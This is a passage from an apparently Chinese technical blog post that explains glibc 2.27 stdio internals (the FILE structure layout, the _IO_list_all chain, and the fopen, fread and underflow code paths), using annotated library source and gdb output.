class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>x86_64</code>上,<code>FILE</code>结构体大小为<code>0xd8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p <span class="title function_">sizeof</span><span class="params">(FILE)</span></span><br><span class="line">$5 = <span class="number">0xd8</span></span><br></pre></td></tr></table></figure>

<p>在glibc中保存了一个全局指针<code>_IO_list_all</code></p>
<p>它指向程序第一个<code>IO_FILE</code>结构体,也就是<code>stderr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ptype _IO_list_all</span><br><span class="line">type = <span class="keyword">struct</span> _IO_FILE_plus &#123;</span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125; *</span><br><span class="line">gef➤  p &amp;_IO_list_all</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7dd3660</span> &lt;__GI__IO_list_all&gt;</span><br><span class="line">gef➤  p _IO_list_all</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7ffff7dd3680</span> &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>

<p>实际上打印其类型时发现并不是一个<code>_IO_FILE</code>,而是一个<code>_IO_FILE_plus</code>,这两者是包含关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>stderr,stdout,stdin</code>,实际上就是三个FILE</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924184530135.png" alt="image-20240924184530135"></p>
<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fopen	_IO_new_fopen @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">87</span></span><br><span class="line">	-&gt;__fopen_internal @glibc<span class="number">-2.27</span>/libio/iofopen.c:<span class="number">56</span></span><br><span class="line">		</span><br><span class="line">        new_f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> locked_FILE));		<span class="comment">//locked_FILE = &#123;IO_FILE_plus fp; _IO_lock_t; _IO_wide_data;&#125;</span></span><br><span class="line">		</span><br><span class="line">		_IO_JUMPS	<span class="comment">//new_f-&gt;fp-&gt;vtable = &amp;_IO_file_jumps</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        -&gt;_IO_new_file_init_internal @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">106</span></span><br><span class="line">            -&gt;_IO_link_in @glibc<span class="number">-2.27</span>/libio/genops.c:<span class="number">86</span></span><br><span class="line">				fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;		<span class="comment">//头插法上链</span></span><br><span class="line">				_IO_list_all = fp;</span><br><span class="line"></span><br><span class="line">		-&gt;_IO_new_file_fopen @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">212</span></span><br><span class="line">            语法分析打开模式(rwa/+xbmce)</span><br><span class="line">            -&gt;_IO_file_open @glibc<span class="number">-2.27</span>/libio/fileops.c:<span class="number">181</span></span><br><span class="line">                -&gt;file._fileno = open() 使用系统调用,返回文件描述符</span><br><span class="line">                -&gt;_IO_link_in										<span class="comment">//实际上已经在_IO_link_in上过链了,哈基米知道已经上链会自己判重的</span></span><br><span class="line">                </span><br><span class="line">        如果_IO_new_file_fopen返回了文件指针fp,说明打开文件成功</span><br><span class="line">        否则-&gt;_IO_un_link 下链然后 <span class="built_in">free</span>(new_f)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240924183957858.png" alt="file = fopen"></p>
<h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp);</span><br></pre></td></tr></table></figure>

<p>从fp指向的文件, 每次读取size宽度的数据,读取count个单位的数据,到缓冲区buf, 返回实际读取字节数</p>
<h4 id="申请缓冲区"><a href="#申请缓冲区" class="headerlink" title="申请缓冲区"></a>申请缓冲区</h4><p>fread包装了read系统调用, 在堆块上建立缓冲区, 一次性使用read读取大量数据到缓冲区,减少多次调用read造成的上下文切换和io开销</p>
<p>第一次调用fread函数,_IO_file_xsgetn首先判断当前FILE是否有缓冲区,如果没有则申请一个,会在堆上要0x1000个字节的堆块,也就是1K的堆块作为缓冲区</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br><span class="line">			-&gt;_IO_doallocbuf</span><br><span class="line">				-&gt;_IO_file_doallocate @glibc2<span class="number">.27</span>/libio/filedoalloc.c:<span class="number">77</span></span><br><span class="line">					-&gt;p=<span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line">					-&gt;_IO_setb(_IO_FILE *f=fp, <span class="type">char</span> *b=p, <span class="type">char</span> *eb=p+<span class="number">0x1000</span>, <span class="type">int</span> a=<span class="number">1</span>)	@glibc2<span class="number">.27</span>/libio/genops.c: <span class="number">346</span></span><br><span class="line">						如果fp之前有缓冲区,现在要喜新厌旧了</span><br><span class="line">						fp-&gt;_IO_buf_base=b</span><br><span class="line">						fp-&gt;_IO_buf_end=eb</span><br><span class="line">						<span class="keyword">if</span>(a == <span class="number">1</span>) f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>

<p>申请缓冲区这部分代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);						<span class="comment">//申请缓冲区去了</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>申请完了后开始读取</p>
<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p>读取的逻辑是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//have表示当前缓冲区中,剩余字节数</span><br><span class="line">//want表示还剩多少字节需要读,当want降为0时意味着满足了需求</span><br><span class="line"></span><br><span class="line">如果缓冲区余料多于需求,则直接满足</span><br><span class="line">否则</span><br><span class="line">	如果一整个缓冲区的大小足够want则先放到缓冲区然后满足</span><br><span class="line">	否则也就是说一整个缓冲区大小都不够,此时缓冲没有意义了,直接全系统调用满足</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)		<span class="comment">//fp文件指针,data目的地,n总共需要读取的字节数</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t want, have;		<span class="comment">//want剩余想要读取的字节数, have缓冲区剩余的字节数</span></span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span> *s = data;				<span class="comment">//s作为data的迭代器</span></span><br><span class="line"></span><br><span class="line">  want = n;					</span><br><span class="line"></span><br><span class="line"><span class="comment">//此处略去没有缓冲区时申请缓冲区的逻辑</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;				<span class="comment">//直到读取到文件EOF或者满足了want的要求才会跳出循环</span></span><br><span class="line">      	have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;		<span class="comment">//缓冲区末尾与当前指针的距离,就是缓冲区剩余字节数</span></span><br><span class="line">      	<span class="keyword">if</span> (want &lt;= have)&#123;								<span class="comment">//如果缓冲区中余料充足</span></span><br><span class="line">	  		<span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);				</span><br><span class="line">	  		fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  		want = <span class="number">0</span>;									<span class="comment">//已满足要求</span></span><br><span class="line">		&#125; <span class="keyword">else</span>	&#123;										<span class="comment">//否则</span></span><br><span class="line">            	<span class="comment">//如果控制流到此,说明缓冲区余料太少了,不能直接满足want要求</span></span><br><span class="line">	  		<span class="keyword">if</span> (have &gt; <span class="number">0</span>)&#123;								<span class="comment">//如果缓冲区还有余料</span></span><br><span class="line">	      		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);	<span class="comment">//先把余料吃了再说</span></span><br><span class="line">	      		want -= have;						</span><br><span class="line">	      		fp-&gt;_IO_read_ptr += have;			<span class="comment">//此举导致read_ptr=read_end,缓冲区告罄</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  		<span class="keyword">if</span> (_IO_in_backup (fp))&#123;				<span class="comment">//当上一次刷新缓冲区被中断而没有完成时,上次动作会保存在backup缓冲区,现在要完成未竟之事</span></span><br><span class="line">	      		_IO_switch_to_main_get_area (fp);</span><br><span class="line">	      		<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment">//buf是整个缓冲区,而read是当前有效的缓冲区,此举在判断want是否小于整个缓冲区</span></span><br><span class="line">            <span class="comment">//当want小于一整个缓冲区时,刷新缓冲区才有意义,</span></span><br><span class="line">            <span class="comment">//如果want大于一整个缓冲区,那么此时刷新缓冲只会增加io,不如直接syscall read</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (__underflow (fp) == EOF)	<span class="comment">//只有当want小于一整个缓冲区时才会考虑刷新缓冲区</span></span><br><span class="line">					<span class="keyword">break</span>;									</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">            <span class="comment">//缓冲区复位</span></span><br><span class="line">	  		_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  		_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  		count = want;	<span class="comment">//count用于计算需要使用syscall-read进行io的字节数</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_IO_buf_base)&#123;</span><br><span class="line">	      		_IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      		<span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">					count -= want % block_size;<span class="comment">//减去最后一个不完整的块大小</span></span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		count = _IO_SYSREAD (fp, s, count);							<span class="comment">//把整数个块直接读出来		</span></span><br><span class="line">	  		<span class="keyword">if</span> (count &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">	      		<span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">					fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      		<span class="keyword">else</span></span><br><span class="line">					fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">	      		<span class="keyword">break</span>;</span><br><span class="line">	    	&#125;</span><br><span class="line"></span><br><span class="line">	  		s += count;</span><br><span class="line">	  		want -= count;											<span class="comment">//到此want可能还有剩下的最后不完整的一块,下一次循环时刷新缓冲区满足</span></span><br><span class="line">	  		<span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    		_IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__underflow @</span><br><span class="line">	-&gt;_IO_new_file_underflow @fileops.c:<span class="number">469</span></span><br><span class="line">		指针复位</span><br><span class="line">		-&gt;_IO_file_read</span><br><span class="line">			-&gt;_IO_new_file_underflow</span><br><span class="line">				-&gt;__read(fp-&gt;_fileno, buf, size)</span><br></pre></td></tr></table></figure>

<p>fread调用的underflow和fwrite调用的overflow是一对兄弟函数</p>
<p>underflow意思是从文件往缓冲区载入数据,维持读缓冲区满</p>
<p>overflow意思是从缓冲区向文件写入数据,维持写缓冲区空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)<span class="comment">//如果当前fp字节流使用宽字节,则调用fwide</span></span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))<span class="comment">//如果当前fp处于写入状态,则切换状态为读取状态</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有东西则返回当前read_ptr指向的字节</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))			</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>_IO_UNDERFLOW</code>实际上调用的_<code>IO_new_file_underflow</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_underflow(FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)		<span class="comment">//必须要有READ权限</span></span><br><span class="line">    &#123;</span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno(EBADF);</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">//如果缓冲区还有剩余的东西,则不允许刷新</span></span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)		<span class="comment">//如果还没有建立缓冲区,现在就建立</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">        &#125;</span><br><span class="line">        _IO_doallocbuf(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))		<span class="comment">//对于行缓冲和无缓冲的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">       required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">       traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">       not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">       explicitly.  --drepper */</span></span><br><span class="line">        _IO_acquire_lock(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">            _IO_OVERFLOW(<span class="built_in">stdout</span>, EOF);<span class="comment">//刷新stdout缓冲</span></span><br><span class="line"></span><br><span class="line">        _IO_release_lock(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _IO_switch_to_get_mode(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">       pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">       we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">       input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<span class="comment">//缓冲区复位</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">    count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base,		<span class="comment">//缓冲区更新,从文件读取,塞满整个缓冲区</span></span><br><span class="line">                        fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">            fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fp-&gt;_IO_read_end += count;			<span class="comment">//读缓冲区根据实际count数决定</span></span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">       handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">       unset it.  */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="vtable何时发挥作用"><a href="#vtable何时发挥作用" class="headerlink" title="vtable何时发挥作用?"></a>vtable何时发挥作用?</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread @glibc2<span class="number">.27</span>/libio/iofread.c:<span class="number">30</span></span><br><span class="line">	-&gt;_IO_sgetn	<span class="comment">//_IO_XSGETN</span></span><br><span class="line">		-&gt;_IO_file_xsgetn @glibc2<span class="number">.27</span>/libio/fileops.c:<span class="number">1294</span></span><br></pre></td></tr></table></figure>

<p>从<code>_IO_sgetn</code>调用<code>_IO_file_xsgetn</code>时首先需要‘调用’<code>_IO_XSGETN</code>,这实际上是一个宏定义</p>
